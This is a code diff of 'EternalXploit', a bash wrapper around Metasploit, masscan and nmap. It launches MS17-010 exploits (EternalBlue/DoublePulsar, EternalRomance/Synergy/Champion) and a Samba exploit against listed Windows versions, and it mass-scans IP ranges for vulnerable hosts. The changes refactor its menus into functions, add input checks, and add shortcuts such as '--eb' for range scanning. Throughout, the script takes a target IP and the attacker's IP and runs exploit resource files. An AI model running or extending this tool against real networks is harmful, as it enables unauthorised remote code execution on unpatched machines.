@@ -1,13 +1,15 @@
 #!/bin/bash
+# EternalXploit by Gl33ch3r          
+# https://github.com/Gl33ch3r/EternalXploit
+
 # Eternal Xploit Logo
-
-
 red='\e[1;31m'
 white='\033[0;37m'        # White
 yellow='\033[0;33m'       # Yellow
 blue='\033[0;34m'         # Blue
 green='\033[0;32m'        # Green
 wine32=/usr/lib/wine/wine
+version="1.0"
 
 logo() {
 echo
@@ -16,7 +18,7 @@ echo -e "$red"'            ###' "$green"'     Naval Intelligence and Security Fo
 echo -e "$red"'            ###' "$green"'     ********** Philippine Navy **********     '"$red"  '###'
 echo -e "$red"'            ###' "$green"' Vulnerability Assesstment Penetration Testing '"$red"  '###'
 echo -e "$red"'            #######################################################'
-echo -e "$red"'                    COd3d By: Gl33ch3r     '"$green"'Version: ' "$yellow"'1.0'
+echo -e "$red"'                    COd3d By:'"$green"' Gl33ch3r     '"$green"'Version: ' "$yellow"'1.0'
 echo -e "$white"
 }
 
@@ -43,8 +45,6 @@ vulnostmp="vulnostmp.txt"
 nmap_path="MS17_010_nmap.txt"
 install="install.txt"
 
-
-
 if [ -e $defdir/$install ]
 then
 fls="0"
@@ -56,14 +56,21 @@ fi
 if [ $fls == "1" ]
 then
 echo
+echo -e "$green" "Your EternalXploit Data Files were moved to :"
+echo
+echo -e "$yellow" "$defdir"
+echo -e ""
+echo -e "$yellow" "Press ENTER key To Continue"
+read -r cont
+yes | cp -rf EternalXploit /usr/local/sbin/ >/dev/null 2>&1
+echo "install" >> "$defdir/$install"
+echo ""
 echo -e "$green" "EternalXploit was installed in your system"
 echo ""
 echo -e "$yellow" "Write (EternalXploit) anywhere to run it."
 echo ""
 echo -e "$yellow" "Press ENTER key To Continue"
 read -r cont
-yes | cp -rf EternalXploit /usr/local/sbin/ #>/dev/null 2>&1
-echo "install" >> "$defdir/$install"
 fi
 
 
@@ -81,6 +88,10 @@ delf
 else
 if [ ! -f "$defdir/$vulnos" ]
 then
+echo "Vulnerable Ips to Eternal Blue exploit (MS17-010) - Scanned by Eternal Scanner" > $defdir/$vulnos
+echo "------------------------------------------------------------------------------" >> $defdir/$vulnos
+echo "             Detailed Vulnerable IP & Operating System File                   " >> $defdir/$vulnos
+echo "+----------------------------------------------------------------------------+" >> $defdir/$vulnos
 echo "$vuln2" >> "$defdir/$vulnostmp"
 awk '!a[$0]++' $defdir/$vulnostmp > $defdir/$vulnos 2>&1
 rm -f $defdir/$vulnostmp >/dev/null 2>&1
@@ -114,6 +125,10 @@ delf
 else
 if [ ! -f "$defdir/$vuln2os" ]
 then
+echo "Vulnerable Ips to Eternal Blue exploit (MS17-010) - Scanned by Eternal Scanner" > $defdir/$vulnos
+echo "------------------------------------------------------------------------------" >> $defdir/$vulnos
+echo "             Detailed Vulnerable IP & Operating System File                   " >> $defdir/$vulnos
+echo "+----------------------------------------------------------------------------+" >> $defdir/$vulnos
 echo "$vuln2" >> "$defdir/$vulnostmp"
 awk '!a[$0]++' $defdir/$vulnostmp > $defdir/$vuln2os 2>&1
 rm -f $defdir/$vulnostmp >/dev/null 2>&1
@@ -192,42 +207,8 @@ rm -f "$defdir/$vulnertmp" >/dev/null 2>&1
 rm -f "$defdir/stat" >/dev/null 2>&1
 }
 
-
-if [ -e $dir/eternalblue_doublepulsar.rb ] && [ -d $dir/deps/ ]
-then
-if test -x $wine32; 
-then
-logo
-echo
-echo '     Exploits'
-echo
-echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"' MS17-010 EXPLOIT'
-echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"' SAMBA EXPLOIT'
-echo
-echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"' Exit'
-echo -e "$yellow"
-read -p '     Please select exploit: ' opts
-if [[ $opts -eq 1 ]] 
-then
-clear
-logo
-echo -e "$white"
-echo '     Enternal Exploits/Scanner'
-echo
-echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"'   Eternalblue Doublepulsar Exploit'
-echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"'   EternalBlue SMB Remote Windows Kernel Pool Corruption Exploit'
-echo -e '     '"$red"'['"$white"'3'"$red"']'"$white"'   EternalRomance/Synergy/Champion Remote Code Execution Exploit'
-echo -e '     '"$red"'['"$white"'4'"$red"']'"$white"'   Nmap MS17-010 Eternalblue Scanner'
-echo -e '     '"$red"'['"$white"'5'"$red"']'"$white"'   MS17-010 Eternalblue Scanner'
-echo -e '     '"$red"'['"$white"'6'"$red"']'"$white"'   EternalRomance/Synergy/Champion Remote Code Execution Scanner'
-echo
-echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"' Back'
-echo -e "$green"
-read -p '     Please select exploit: ' exploit
-if [[ $exploit -eq 1 ]]
-then
-clear
-logo
+# Eternalblue Doublepulsar Exploit
+eternalblue_doublepulsar(){
 echo
 echo -e "$red"'       ****************' "$yellow"'Eternalblue Doublepulsar Exploit'"$red"' ****************'
 	echo -e "$white"
@@ -235,25 +216,56 @@ echo -e "$red"'       ****************' "$yellow"'Eternalblue Doublepulsar Explo
 	echo
    	echo '     Id  Name'
         echo '     --  ----'
-        echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"'   Windows XP (all services pack) (x86) (x64)'
-        echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"'   Windows Server 2003 SP0 (x86)'
-        echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"'   Windows Server 2003 SP1/SP2 (x86)'
-        echo -e '     '"$red"'['"$white"'3'"$red"']'"$white"'   Windows Server 2003 (x64)'
-        echo -e '     '"$red"'['"$white"'4'"$red"']'"$white"'   Windows Vista (x86)'
-        echo -e '     '"$red"'['"$white"'5'"$red"']'"$white"'   Windows Vista (x64)'
-        echo -e '     '"$red"'['"$white"'6'"$red"']'"$white"'   Windows Server 2008 (x86)' 
-        echo -e '     '"$red"'['"$white"'7'"$red"']'"$white"'   Windows Server 2008 R2 (x86) (x64)'
-        echo -e '     '"$red"'['"$white"'8'"$red"']'"$white"'   Windows 7 (all services pack) (x86) (x64)'
+        echo -e '     '"$red"'['"$yellow"'0'"$red"']'"$white"'   Windows XP (all services pack) (x86) (x64)'
+        echo -e '     '"$red"'['"$yellow"'1'"$red"']'"$white"'   Windows Server 2003 SP0 (x86)'
+        echo -e '     '"$red"'['"$yellow"'2'"$red"']'"$white"'   Windows Server 2003 SP1/SP2 (x86)'
+        echo -e '     '"$red"'['"$yellow"'3'"$red"']'"$white"'   Windows Server 2003 (x64)'
+        echo -e '     '"$red"'['"$yellow"'4'"$red"']'"$white"'   Windows Vista (x86)'
+        echo -e '     '"$red"'['"$yellow"'5'"$red"']'"$white"'   Windows Vista (x64)'
+        echo -e '     '"$red"'['"$yellow"'6'"$red"']'"$white"'   Windows Server 2008 (x86)' 
+        echo -e '     '"$red"'['"$yellow"'7'"$red"']'"$white"'   Windows Server 2008 R2 (x86) (x64)'
+        echo -e '     '"$red"'['"$yellow"'8'"$red"']'"$white"'   Windows 7 (all services pack) (x86) (x64)'
 	echo -e "$green"
 	read -p  '     Please select target: ' target
 echo -e "$white"
 echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
 echo -e "$white"
 read -p '     Target IP Address: ' iptarget
+if [[ -z "$iptarget" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address"
+exit 1
+fi
+
+#check if user input have any letters
+inv=$(echo "$iptarget" | grep [a-zA-Z] )
+if [[ ! -z "$inv" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address" 
+exit 1
+fi
 echo -e "$white"
 echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
 echo -e "$white"
 read -p '     Your IP Address: ' ip
+
+if [[ -z "$ip" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address"
+exit 1
+fi
+
+#check if user input have any letters
+inv=$(echo "$ip" | grep [a-zA-Z] )
+if [[ ! -z "$inv" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address" 
+exit 1
+fi
 echo -e "$white"
 echo -e "$yellow"'     Range: '"$green"'0 to 65535'
 echo -e "$white"
@@ -333,16 +345,32 @@ EternalXploit
 else
 echo Invalid option...exiting...
 fi
-elif [[ $exploit -eq 2 ]]
-then
-clear
-logo
+}
+
+
+# MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+eternalblue(){
 echo
 echo -e "$red"'     *** '"$yellow"'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption'"$red"' ***'
 echo -e "$white"
 echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
 echo -e "$white"
 read -p '     Target IP Address: ' iptarget
+if [[ -z "$iptarget" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address"
+exit 1
+fi
+
+#check if user input have any letters
+inv=$(echo "$iptarget" | grep [a-zA-Z] )
+if [[ ! -z "$inv" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address" 
+exit 1
+fi
 echo
 echo -e "$red"'            #######################################################'
 echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
@@ -358,16 +386,31 @@ msfconsole -q -r config.rc
 rm config.rc
 clear
 EternalXploit
-elif [[ $exploit -eq 3 ]]
-then
-clear
-logo
+}
+
+# MS17-010 EternalRomance/Synergy/Champion Remote Code Execution
+eternalromance(){
 echo
 echo -e "$red"'     *** '"$yellow"'MS17-010 EternalRomance/Synergy/Champion Remote Code Execution'"$red"' ***'
 echo -e "$white"
 echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
 echo -e "$white"
 read -p '     Target IP Address: ' iptarget
+if [[ -z "$iptarget" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address"
+exit 1
+fi
+
+#check if user input have any letters
+inv=$(echo "$iptarget" | grep [a-zA-Z] )
+if [[ ! -z "$inv" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address" 
+exit 1
+fi
 echo
 echo -e "$red"'            #######################################################'
 echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
@@ -383,42 +426,27 @@ msfconsole -q -r config.rc
 rm config.rc
 clear
 EternalXploit
-elif [[ $exploit -eq 4 ]]
-then
-clear
-logo
-echo
-echo -e "$red"'     ************************* '"$yellow"'Nmap MS17-010 Scanner'"$red"' **********************'
-echo
-echo
-echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
-echo -e "$yellow"'         '"$green"'192.168.1.1/24'
-echo -e "$white"
-read -p '     IP/IP Range: ' iptarget
-echo
-echo -e "$red"'            #######################################################'
-echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
-echo -e "$red"'            #######################################################'
-echo -e "$white"
-nmap -oN $defdir/$nmap_path -T4 -v -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 $iptarget >/dev/null 2>&1 
-echo
-echo -e "$yellow""     Nmap MS17-010 result saved to $defdir/$nmap_path"
-echo
-echo
-EternalXploit
-elif [[ $exploit -eq 5 ]]
-then
+}
+
+eternalblue_scanner(){
 mass="$defdir/masscan"
 delf
-clear
-logo
-echo
-echo -e "$red"'     **** '"$yellow"'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Scanner'"$red"' ****'
-echo -e "$white"
-echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
-echo -e "$yellow"'         '"$green"'192.168.1.1/24'
-echo -e "$white"
-read -p '     IP/IP Range: ' iptarget
+if [[ -z "$iptarget" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP/IP Range"
+exit 1
+fi
+
+#check if user input have any letters
+inv=$(echo "$iptarget" | grep [a-zA-Z] )
+if [[ ! -z "$inv" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP/IP Range" 
+exit 1
+fi
+
 echo
 echo -e "$green" "    Press CTRL-C (1X ONLY) to stop the scanner "
 echo ""
@@ -452,12 +480,12 @@ exit 1
 fi
 stat="0"
 echo ""
-echo -e "$red" "      Checking ips :"
-echo -e "$yellow""----------------------------"
+echo -e "$red" "           Checking ips :"
+echo -e "$yellow""     ----------------------------"
 echo -e "$green" ""
-cat "$defdir/msfip"
+echo "            ""$(cat $defdir/msfip)"
 echo ""
-echo -e "$yellow""----------------------------"
+echo -e "$yellow""     ----------------------------"
 lc=$(cat $defdir/msfip | wc -l)
 echo "     Collected $lc ips"
 echo -e "$yellow""     Checking if the $lc ips are vulnerable"
@@ -483,20 +511,28 @@ msfconsole -q -r config.rc >/dev/null 2>&1
 /etc/init.d/postgresql stop >/dev/null 2>&1
 rm config.rc
 getdata
-EternalXploit
-elif [[ $exploit -eq 6 ]]
-then
+
+}
+
+eternalromance_scanner(){
 mass="$defdir/masscan"
 delf
-clear
-logo
-echo
-echo -e "$red"'     ****************' "$yellow"'MS17-010 Remote Code Execution Scanner '"$red"'**************'
-echo -e "$white"
-echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
-echo -e "$yellow"'         '"$green"'192.168.1.1/24'
-echo -e "$white"
-read -p '     IP/IP Range: ' iptarget
+if [[ -z "$iptarget" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP/IP Range"
+exit 1
+fi
+
+#check if user input have any letters
+inv=$(echo "$iptarget" | grep [a-zA-Z] )
+if [[ ! -z "$inv" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP/IP Range" 
+exit 1
+fi
+
 echo
 echo -e "$green" "    Press CTRL-C (1X ONLY) to stop the scanner "
 echo ""
@@ -531,12 +567,13 @@ exit 1
 fi
 stat="0"
 echo ""
-echo -e "$red" "      Checking ips :"
-echo -e "$yellow""----------------------------"
-echo -e "$green" ""
-cat "$defdir/msfip"
 echo ""
-echo -e "$yellow""----------------------------"
+echo -e "$red" "           Checking ips :"
+echo -e "$yellow""     ----------------------------"
+echo -e "$green" ""
+echo "            ""$(cat $defdir/msfip)"
+echo ""
+echo -e "$yellow""     ----------------------------"
 lc=$(cat $defdir/msfip | wc -l)
 echo "     Collected $lc ips"
 echo -e "$yellow""     Checking if the $lc ips are vulnerable"
@@ -562,6 +599,188 @@ msfconsole -q -r config.rc >/dev/null 2>&1
 /etc/init.d/postgresql stop >/dev/null 2>&1
 rm config.rc
 getdata2
+
+}
+
+# Shortcuts
+
+if [ "$1" == "--version" ]
+then
+echo -e "$yellow""version $version"
+exit 1
+elif  [ "$1" == "--uninstall" ]
+then
+echo -e "$red""*** "$yellow"Warning EternalXploit will be uninstalled "$red"***"
+echo -e "$yellow" "Press ENTER key To Continue"
+read -r cont
+rm -f /usr/local/sbin/EternalXploit >/dev/null 2>&1
+rm -f "$defdir/$install"
+exit 1
+elif [ "$1" == "--help" ]
+then
+echo
+echo -e "$red"'            ################### '"$green"'EternalXploit'"$yellow" $version"$red"' ##################'
+echo -e "$green""                  (https://github.com/Gl33ch3r/EternalXploit)"
+echo -e "$red""            --------------------------------------------------------"
+echo -e "$white"
+echo "Available Shortcuts :"
+echo ""
+echo "EternalXploit --eb 192.168.1.1/24 (EternalBlue Vulnerability Scanner"
+echo "EternalXploit --er 192.168.1.1/24 (EternalRomance Vulnerability Scanner)"
+echo "EternalXploit --help (Display available shortcuts)"
+echo "EternalXploit --version (Display current version)"
+echo ""
+echo -e "$yellow""Example :""$green"" EternalXploit --eb 192.168.1.1/24"
+echo ""
+exit 1
+elif [ "$1" == "--eb" ]
+then
+if [ -z "$2" ]
+then
+EternalXploit --help
+echo -e "$yellow" "Value missing"
+echo ""
+echo -e "$green" "Try (EternalXploit --eb 192.168.1.1)"
+echo
+exit 1
+else
+iptarget="$2"
+logo
+eternalblue_scanner
+exit 1
+fi
+elif [ "$1" == "--er" ]
+then
+if [ -z "$2" ]
+then
+EternalXploit --help
+echo -e "$yellow" "Value missing"
+echo ""
+echo -e "$green" "Try (EternalXploit --er 192.168.1.1)"
+echo
+exit 1
+else
+iptarget="$2"
+logo
+eternalromance_scanner
+exit 1
+fi
+fi
+
+
+
+if [ -e $dir/eternalblue_doublepulsar.rb ] && [ -d $dir/deps/ ]
+then
+if test -x $wine32; 
+then
+logo
+echo
+echo -e "$red"'            **********************'"$yellow"' Exploits '"$red"'***********************'
+echo
+echo
+echo -e '     '"$red"'['"$yellow"'1'"$red"']'"$white"' MS17-010 Exploit'
+echo -e '     '"$red"'['"$yellow"'2'"$red"']'"$white"' Samba Exploit'
+echo
+echo -e '     '"$red"'['"$yellow"'0'"$red"']'"$red"' Exit'
+echo -e "$green"
+read -p '     Please select exploit: ' opts
+if [[ $opts -eq 1 ]] 
+then
+clear
+logo
+echo -e "$white"
+echo '     Enternal Exploits/Scanner'
+echo
+echo -e '     '"$red"'['"$yellow"'1'"$red"']'"$white"'   Eternalblue Doublepulsar Exploit'
+echo -e '     '"$red"'['"$yellow"'2'"$red"']'"$white"'   EternalBlue SMB Remote Windows Kernel Pool Corruption Exploit'
+echo -e '     '"$red"'['"$yellow"'3'"$red"']'"$white"'   EternalRomance/Synergy/Champion Remote Code Execution Exploit'
+echo -e '     '"$red"'['"$yellow"'4'"$red"']'"$white"'   Nmap MS17-010 Eternalblue Scanner'
+echo -e '     '"$red"'['"$yellow"'5'"$red"']'"$white"'   MS17-010 Eternalblue Scanner'
+echo -e '     '"$red"'['"$yellow"'6'"$red"']'"$white"'   EternalRomance/Synergy/Champion Remote Code Execution Scanner'
+echo
+echo -e '     '"$red"'['"$yellow"'0'"$red"']'"$red"'   Back'
+echo -e "$green"
+read -p '     Please select exploit: ' exploit
+if [[ $exploit -eq 1 ]]
+then
+clear
+logo
+eternalblue_doublepulsar
+elif [[ $exploit -eq 2 ]]
+then
+clear
+logo
+eternalblue
+elif [[ $exploit -eq 3 ]]
+then
+clear
+logo
+eternalromance
+elif [[ $exploit -eq 4 ]]
+then
+clear
+logo
+echo
+echo -e "$red"'     ************************* '"$yellow"'Nmap MS17-010 Scanner'"$red"' **********************'
+echo
+echo
+echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
+echo -e "$yellow"'         '"$green"'192.168.1.1/24'
+echo -e "$white"
+read -p '     IP/IP Range: ' iptarget
+
+if [[ -z "$iptarget" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP/IP Range"
+exit 1
+fi
+
+#check if user input have any letters
+inv=$(echo "$iptarget" | grep [a-zA-Z] )
+if [[ ! -z "$inv" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP/IP Range" 
+exit 1
+fi
+
+echo
+echo -e "$red"'            #######################################################'
+echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
+echo -e "$red"'            #######################################################'
+echo -e "$white"
+nmap -oN $defdir/$nmap_path -T4 -v -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 $iptarget >/dev/null 2>&1 
+echo
+echo -e "$yellow""     Nmap MS17-010 result saved to $defdir/$nmap_path"
+echo
+echo
+EternalXploit
+elif [[ $exploit -eq 5 ]]
+then
+clear
+logo
+echo
+echo -e "$red"'     **** '"$yellow"'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Scanner'"$red"' ****'
+echo -e "$white"
+echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
+echo -e "$yellow"'         '"$green"'192.168.1.1/24'
+echo -e "$white"
+read -p '     IP/IP Range: ' iptarget
+eternalblue_scanner
+EternalXploit
+elif [[ $exploit -eq 6 ]]
+then
+clear
+logo
+echo
+echo -e "$red"'     ****************' "$yellow"'MS17-010 Remote Code Execution Scanner '"$red"'**************'
+echo -e "$white"
+echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
+echo -e "$yellow"'         '"$green"'192.168.1.1/24'
+echo -e "$white"
+read -p '     IP/IP Range: ' iptarget
+eternalromance_scanner
 EternalXploit
 elif [[ $exploit -eq 0 ]]
 then
@@ -598,6 +817,21 @@ echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
 echo -e "$yellow"'         '"$green"'192.168.1.1/24'
 echo -e "$white"
 read -p '     IP/IP Range: ' iptarget
+if [[ -z "$iptarget" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP/IP Range"
+exit 1
+fi
+
+#check if user input have any letters
+inv=$(echo "$iptarget" | grep [a-zA-Z] )
+if [[ ! -z "$inv" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP/IP Range" 
+exit 1
+fi
 echo
 echo -e "$red"'            #######################################################'
 echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
@@ -616,6 +850,21 @@ echo -e "$white"
 echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
 echo -e "$white"
 read -p '     Target IP Address: ' iptarget
+if [[ -z "$iptarget" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address"
+exit 1
+fi
+
+#check if user input have any letters
+inv=$(echo "$iptarget" | grep [a-zA-Z] )
+if [[ ! -z "$inv" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address" 
+exit 1
+fi
 echo
 echo -e "$red"'            #######################################################'
 echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
@@ -649,4 +898,9 @@ fi
 else
 checkfile
 fi
+
+
+
+
+
 
